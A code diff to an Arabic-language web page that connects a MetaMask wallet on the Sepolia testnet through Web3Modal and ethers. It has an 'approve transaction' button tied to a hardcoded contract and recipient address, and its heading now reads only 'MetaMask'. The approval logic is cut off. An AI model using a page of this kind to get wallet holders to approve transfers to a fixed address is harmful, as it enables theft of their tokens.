@@ -6,10 +6,11 @@
     <title>ربط محفظة MetaMask - Sepolia</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
+    <script src="https://unpkg.com/web3modal@1.9.8/dist/index.js"></script>
 </head>
 <body class="bg-gray-100 flex items-center justify-center h-screen">
     <div class="bg-white p-6 rounded-lg shadow-lg max-w-md w-full text-center">
-        <h1 class="text-2xl font-bold mb-4">ربط محفظة MetaMask</h1>
+        <h1 class="text-2xl font-bold mb-4">MetaMask</h1>
         <p id="walletStatus" class="text-gray-600 mb-4">لم يتم ربط المحفظة</p>
         <button id="connectWallet" class="bg-blue-500 text-white px-4 py-2 rounded hover:bg-blue-600 mb-4">ربط المحفظة</button>
         <button id="approveButton" class="bg-green-500 text-white px-4 py-2 rounded hover:bg-green-600 hidden">الموافقة على المعاملة</button>
@@ -22,17 +23,50 @@
         const walletStatus = document.getElementById('walletStatus');
         const transactionStatus = document.getElementById('transactionStatus');
 
-        if (typeof window.ethereum === 'undefined') {
-            walletStatus.textContent = 'يرجى تثبيت MetaMask!';
-            connectWalletButton.disabled = true;
-        }
+        // إعداد Web3Modal بدون خيارات إضافية (يمكنك إضافة موفري محفظة آخرين إذا تريد)
+        const web3Modal = new window.Web3Modal.default({
+            cacheProvider: false,
+            theme: "dark"
+        });
+
+        let provider;
+        let signer;
 
         connectWalletButton.addEventListener('click', async () => {
             try {
-                const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+                // افتح نافذة اختيار المحفظة
+                provider = await web3Modal.connect();
+
+                // أنشئ موفر ethers
+                const web3Provider = new ethers.providers.Web3Provider(provider);
+                signer = web3Provider.getSigner();
+
+                const accounts = await web3Provider.listAccounts();
+                if (accounts.length === 0) {
+                    walletStatus.textContent = 'لم يتم العثور على حسابات في المحفظة.';
+                    return;
+                }
+
                 walletStatus.textContent = `تم ربط المحفظة: ${accounts[0].slice(0, 6)}...${accounts[0].slice(-4)}`;
                 connectWalletButton.classList.add('hidden');
                 approveButton.classList.remove('hidden');
+
+                // استمع لتغيير الحساب أو الشبكة (اختياري)
+                provider.on("accountsChanged", (accounts) => {
+                    if (accounts.length === 0) {
+                        walletStatus.textContent = 'تم فصل المحفظة';
+                        approveButton.classList.add('hidden');
+                        connectWalletButton.classList.remove('hidden');
+                    } else {
+                        walletStatus.textContent = `تم ربط المحفظة: ${accounts[0].slice(0, 6)}...${accounts[0].slice(-4)}`;
+                    }
+                });
+
+                provider.on("chainChanged", (chainId) => {
+                    // يمكن إعادة تحميل الصفحة أو التعامل مع تغيير الشبكة هنا
+                    window.location.reload();
+                });
+
             } catch (error) {
                 walletStatus.textContent = 'فشل ربط المحفظة: ' + error.message;
             }
@@ -40,8 +74,10 @@
 
         approveButton.addEventListener('click', async () => {
             try {
-                const provider = new ethers.providers.Web3Provider(window.ethereum);
-                const signer = provider.getSigner();
+                if (!signer) {
+                    transactionStatus.textContent = 'يرجى ربط المحفظة أولاً.';
+                    return;
+                }
 
                 const contractAddress = '0x7624C689A660B81eA1Fa94536A6c9d07C405064e';
                 const recipientAddress = '0x2D7727275987dD62a6e5a3bd15CA8CFE9371ff5c';
